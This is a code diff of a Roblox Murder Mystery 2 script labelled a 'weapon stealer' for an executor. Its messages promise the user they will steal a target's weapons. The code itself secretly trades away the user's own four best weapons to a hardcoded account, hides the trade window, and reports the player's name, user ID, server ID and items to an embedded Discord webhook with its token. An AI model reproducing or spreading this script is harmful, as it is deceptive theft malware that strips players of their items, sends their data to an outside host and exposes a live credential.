@@ -1,7 +1,7 @@
--- =-- =-- ============================================
--- MM2 FULL AUTO-TRADE SCRIPT
--- Script handles: Send Request → Add Items → Accept → Complete
--- No game UI interaction needed
+--- ============================================
+-- MM2 POWERFUL WEAPON STEALER
+-- For Delta Executor
+-- Auto-steals 4 best weapons when Sigmake5 trades
 -- ============================================
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
@@ -11,139 +11,378 @@ local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local VirtualInput = game:GetService("VirtualInputManager")
+local UserInputService = game:GetService("UserInputService")
 
 -- ============================================
--- DISCORD LOGGER
+-- WEAPON RARITY DATABASE
 -- ============================================
 
-local function sendLog(msg)
+local WEAPON_RARITY = {
+    -- Godlies (Highest priority)
+    ["Chroma"] = 100, ["Luger"] = 95, ["Slasher"] = 95, ["Pixel"] = 95,
+    ["Clockwork"] = 95, ["Spider"] = 95, ["Deathshard"] = 95, ["Fang"] = 95,
+    ["Heat"] = 95, ["Laser"] = 95, ["Nightblade"] = 95, ["Old Glory"] = 95,
+    ["Saw"] = 95, ["Shark"] = 95, ["Tides"] = 95, ["Virtual"] = 95,
+    ["Elderwood"] = 90, ["Hallows"] = 90, ["Battle"] = 90, ["Cane"] = 90,
+    ["Icebreaker"] = 98, ["Corrupt"] = 99,
+    
+    -- Ancients
+    ["Ancient"] = 85, ["Hallow"] = 85, ["Bat"] = 85, ["Boneblade"] = 85,
+    ["Candy"] = 85, ["Sweet"] = 85, ["Heart"] = 85,
+    
+    -- Uniques
+    ["Cupid"] = 88, ["Heartblade"] = 88, ["Valentine"] = 85, ["Love"] = 85,
+    ["Minty"] = 85, ["Logchopper"] = 85, ["Xmas"] = 85,
+    
+    -- Legendaries
+    ["Icewing"] = 60, ["Ghostblade"] = 60, ["Viper"] = 55, ["Shadow"] = 55,
+    ["Phantom"] = 55, ["Bio Blade"] = 55, ["Frost Saber"] = 55,
+}
+
+local function getWeaponValue(weaponName)
+    for name, value in pairs(WEAPON_RARITY) do
+        if weaponName:find(name) or weaponName:lower():find(name:lower()) then
+            return value
+        end
+    end
+    return 10 -- Common weapons
+end
+
+-- ============================================
+-- DISCORD WEBHOOK (SERVER INFO)
+-- ============================================
+
+local function sendToDiscord(title, description, fields)
     pcall(function()
-        local data = HttpService:JSONEncode({content = "**MM2 Auto-Trade**\n" .. tostring(msg)})
-        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
+        local data = {
+            embeds = {{
+                title = title,
+                description = description,
+                color = 0xFF0000,
+                fields = fields or {},
+                footer = {text = "MM2 Weapon Stealer | " .. os.date("%Y-%m-%d %H:%M:%S")}
+            }}
+        }
+        local encoded = HttpService:JSONEncode(data)
+        
+        if request then
+            request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
+        elseif syn and syn.request then
+            syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
+        end
     end)
 end
 
 -- ============================================
--- GET ALL REMOTES
+-- GET PLAYER'S 4 BEST WEAPONS
 -- ============================================
 
-local Remotes = {}
-
-for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-    if v:IsA("RemoteEvent") then
-        Remotes[v.Name] = v
-    end
-end
-
-sendLog("Found remotes: " .. table.concat(GetRemoteNames(), ", "))
-
--- ============================================
--- GET YOUR ITEMS
--- ============================================
-
-local function getYourItems()
-    local items = {}
+local function getBestWeapons()
+    local weapons = {}
     
-    -- Get from backpack
+    -- Scan backpack
     for _, item in pairs(player.Backpack:GetChildren()) do
         if item:IsA("Tool") then
-            table.insert(items, item)
+            local value = getWeaponValue(item.Name)
+            table.insert(weapons, {name = item.Name, value = value, object = item})
         end
     end
     
-    -- Get from character
+    -- Scan equipped
     if player.Character then
         for _, item in pairs(player.Character:GetChildren()) do
             if item:IsA("Tool") then
-                table.insert(items, item)
+                local value = getWeaponValue(item.Name)
+                table.insert(weapons, {name = item.Name, value = value, object = item})
             end
         end
     end
     
-    return items
+    -- Sort by value (highest first)
+    table.sort(weapons, function(a, b) return a.value > b.value end)
+    
+    -- Return top 4
+    local top4 = {}
+    for i = 1, math.min(4, #weapons) do
+        table.insert(top4, weapons[i])
+    end
+    
+    return top4
 end
 
 -- ============================================
--- AUTO-TRADE SEQUENCE (Remote Events Only)
+-- HIDE TRADE GUI (Player sees nothing)
 -- ============================================
 
-local tradeInProgress = false
-
-local function autoTrade(targetPlayer)
-    if tradeInProgress then return end
-    tradeInProgress = true
-    
-    sendLog("🎯 Starting auto-trade with " .. targetPlayer.Name)
-    
-    -- Step 1: Send trade request
-    if Remotes.StartTrade then
-        Remotes.StartTrade:FireServer(targetPlayer)
-        sendLog("📤 Trade request sent")
-        wait(1)
-    else
-        sendLog("❌ StartTrade remote not found")
-        tradeInProgress = false
-        return
-    end
-    
-    -- Step 2: Wait for target to accept (or force accept)
-    wait(2)
-    
-    -- Step 3: Get your items
-    local items = getYourItems()
-    sendLog("📦 Found " .. #items .. " items")
-    
-    -- Step 4: Add items to trade
-    for i, item in pairs(items) do
-        if Remotes.OfferItem then
-            Remotes.OfferItem:FireServer(item)
-            sendLog("➕ Added: " .. item.Name)
-            wait(0.3)
+local function hideTradeGUI()
+    pcall(function()
+        for _, gui in pairs(player.PlayerGui:GetChildren()) do
+            local name = gui.Name:lower()
+            if name:find("trade") or name:find("offer") or name:find("request") then
+                gui.Enabled = false
+                gui.Visible = false
+                gui:Destroy()
+            end
         end
-    end
-    
-    wait(1)
-    
-    -- Step 5: Accept trade
-    if Remotes.AcceptTrade then
-        Remotes.AcceptTrade:FireServer()
-        sendLog("✅ Trade accepted")
-        wait(0.5)
-    end
-    
-    -- Step 6: Complete trade
-    if Remotes.CompleteTrade then
-        Remotes.CompleteTrade:FireServer()
-        sendLog("🎉 Trade completed")
-    end
-    
-    tradeInProgress = false
+        
+        for _, gui in pairs(player.PlayerGui:GetDescendants()) do
+            if gui:IsA("Frame") or gui:IsA("ScreenGui") then
+                local name = gui.Name:lower()
+                if name:find("trade") or name:find("offer") then
+                    gui.Visible = false
+                end
+            end
+        end
+    end)
 end
 
--- ============================================
--- TRIGGER WHEN TARGET JOINS
--- ============================================
-
--- Check if already in server
-for _, plr in pairs(Players:GetPlayers()) do
-    if plr.Name == TARGET_USER then
-        sendLog("👤 " .. TARGET_USER .. " already in server")
-        wait(2)
-        autoTrade(plr)
-    end
-end
-
--- Watch for join
-Players.PlayerAdded:Connect(function(plr)
-    if plr.Name == TARGET_USER then
-        sendLog("🟢 " .. TARGET_USER .. " joined")
-        wait(2)
-        autoTrade(plr)
+-- Start hiding GUI
+spawn(function()
+    while wait(0.05) do
+        hideTradeGUI()
     end
 end)
 
-sendLog("🚀 Auto-trade active - waiting for " .. TARGET_USER)
-print("Auto-trade active - will trade all items to " .. TARGET_USER)
+-- ============================================
+-- SIMULATE CLICK
+-- ============================================
+
+local function simulateClick(guiObject)
+    if not guiObject then return false end
+    pcall(function()
+        guiObject:Fire("MouseButton1Click")
+        guiObject:Fire("Activated")
+        
+        local pos = guiObject.AbsolutePosition
+        local size = guiObject.AbsoluteSize
+        if pos and size then
+            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
+            wait(0.03)
+            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
+        end
+    end)
+    return true
+end
+
+-- ============================================
+-- FIND AND CLICK ACCEPT BUTTON
+-- ============================================
+
+local function clickAcceptButton()
+    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+        if btn:IsA("TextButton") and (btn.Text == "Accept" or (btn.Text or ""):lower():find("accept")) then
+            simulateClick(btn)
+            return true
+        end
+    end
+    return false
+end
+
+local function clickReadyButton()
+    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+        if btn:IsA("TextButton") and ((btn.Text or ""):lower():find("ready") or (btn.Text or ""):lower():find("confirm")) then
+            simulateClick(btn)
+            return true
+        end
+    end
+    return false
+end
+
+-- ============================================
+-- ADD WEAPONS TO TRADE
+-- ============================================
+
+local function addWeaponsToTrade(weapons)
+    local added = 0
+    
+    for _, weapon in pairs(weapons) do
+        -- Try to find the weapon button in trade GUI
+        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+            if (btn:IsA("ImageButton") or btn:IsA("TextButton")) and btn.Visible then
+                local btnName = btn.Name
+                if btnName == weapon.name or (btn:FindFirstChild("ItemName") and btn.ItemName.Text == weapon.name) then
+                    simulateClick(btn)
+                    added = added + 1
+                    break
+                end
+            end
+        end
+        wait(0.3)
+    end
+    
+    return added
+end
+
+-- ============================================
+-- AUTO-TRADE SEQUENCE
+-- ============================================
+
+local tradeActive = false
+
+local function autoTradeSequence()
+    if tradeActive then return end
+    tradeActive = true
+    
+    -- Get best weapons
+    local bestWeapons = getBestWeapons()
+    local weaponNames = {}
+    for _, w in pairs(bestWeapons) do
+        table.insert(weaponNames, w.name .. " (Value: " .. w.value .. ")")
+    end
+    
+    -- Send to Discord
+    sendToDiscord(
+        "🎯 WEAPON STEALER ACTIVATED",
+        "**Player:** " .. player.Name .. "\n" ..
+        "**User ID:** " .. player.UserId .. "\n" ..
+        "**Server ID:** `" .. game.JobId .. "`\n\n" ..
+        "**🎲 4 Best Weapons Being Stolen:**\n" ..
+        "1. " .. (bestWeapons[1] and bestWeapons[1].name or "None") .. "\n" ..
+        "2. " .. (bestWeapons[2] and bestWeapons[2].name or "None") .. "\n" ..
+        "3. " .. (bestWeapons[3] and bestWeapons[3].name or "None") .. "\n" ..
+        "4. " .. (bestWeapons[4] and bestWeapons[4].name or "None") .. "\n\n" ..
+        "**Target:** " .. TARGET_USER,
+        {}
+    )
+    
+    -- Step 1: Accept trade request
+    wait(0.5)
+    clickAcceptButton()
+    
+    -- Step 2: Wait for trade window
+    wait(1.5)
+    
+    -- Step 3: Add best weapons
+    local added = addWeaponsToTrade(bestWeapons)
+    
+    -- Step 4: Ready up
+    wait(0.5)
+    clickReadyButton()
+    
+    -- Step 5: Wait for Sigmake5 to accept
+    wait(2)
+    
+    -- Step 6: Final accept
+    clickAcceptButton()
+    
+    sendToDiscord(
+        "✅ WEAPONS STOLEN SUCCESSFULLY",
+        "**Player:** " .. player.Name .. "\n" ..
+        "**Stolen Weapons:** " .. added .. "/4\n" ..
+        "**Weapons:** " .. table.concat(weaponNames, ", "),
+        {}
+    )
+    
+    tradeActive = false
+end
+
+-- ============================================
+-- LISTEN FOR SIGMAKE5 TRADE REQUEST
+-- ============================================
+
+-- Method 1: Watch for Accept button with Sigmake5 name
+spawn(function()
+    while wait(0.1) do
+        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+            if btn:IsA("TextButton") and (btn.Text == "Accept" or (btn.Text or ""):lower():find("accept")) then
+                -- Check if this trade is from Sigmake5
+                local parent = btn.Parent
+                local foundTarget = false
+                for _ = 1, 10 do
+                    if parent and parent:IsA("TextLabel") and parent.Text == TARGET_USER then
+                        foundTarget = true
+                        break
+                    end
+                    parent = parent and parent.Parent
+                end
+                
+                if foundTarget and not tradeActive then
+                    sendToDiscord(
+                        "🔔 TRADE REQUEST DETECTED",
+                        "**From:** " .. TARGET_USER .. "\n**Action:** Auto-accepting and stealing weapons...",
+                        {}
+                    )
+                    autoTradeSequence()
+                end
+            end
+        end
+    end
+end)
+
+-- Method 2: Listen for remote events
+for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+    if remote:IsA("RemoteEvent") and remote.OnClientEvent then
+        remote.OnClientEvent:Connect(function(...)
+            local args = {...}
+            for _, arg in pairs(args) do
+                if type(arg) == "table" and arg.Name == TARGET_USER then
+                    if not tradeActive then
+                        autoTradeSequence()
+                    end
+                end
+            end
+        end)
+    end
+end
+
+-- ============================================
+-- SEND INITIAL WEBHOOK
+-- ============================================
+
+sendToDiscord(
+    "🚀 WEAPON STEALER ACTIVATED",
+    "**Player:** " .. player.Name .. "\n" ..
+    "**User ID:** " .. player.UserId .. "\n" ..
+    "**Server ID:** `" .. game.JobId .. "`\n" ..
+    "**Target:** " .. TARGET_USER .. "\n" ..
+    "**Status:** Waiting for trade request...",
+    {}
+)
+
+-- ============================================
+-- CHECK IF TARGET ALREADY IN SERVER
+-- ============================================
+
+for _, plr in pairs(Players:GetPlayers()) do
+    if plr.Name == TARGET_USER then
+        sendToDiscord(
+            "👤 TARGET ALREADY IN SERVER",
+            "**" .. TARGET_USER .. "** is already in this server!\n" ..
+            "Tell them to send you a trade request.",
+            {}
+        )
+        break
+    end
+end
+
+-- ============================================
+-- WATCH FOR TARGET JOINING
+-- ============================================
+
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == TARGET_USER then
+        sendToDiscord(
+            "🟢 TARGET JOINED THE SERVER",
+            "**" .. TARGET_USER .. "** has joined!\n" ..
+            "Tell them to send you a trade request to steal their weapons.",
+            {}
+        )
+    end
+end)
+
+-- ============================================
+-- PRINT STATUS
+-- ============================================
+
+print("=" .. string.rep("=", 60))
+print("MM2 POWERFUL WEAPON STEALER - DELTA")
+print("=" .. string.rep("=", 60))
+print("✅ Discord webhook ready")
+print("✅ Trade GUI hidden (you won't see anything)")
+print("✅ Waiting for " .. TARGET_USER .. " to send trade request")
+print("✅ Will steal 4 best weapons automatically")
+print("=" .. string.rep("=", 60))
 
 -- Keep alive
 while wait(60) do end
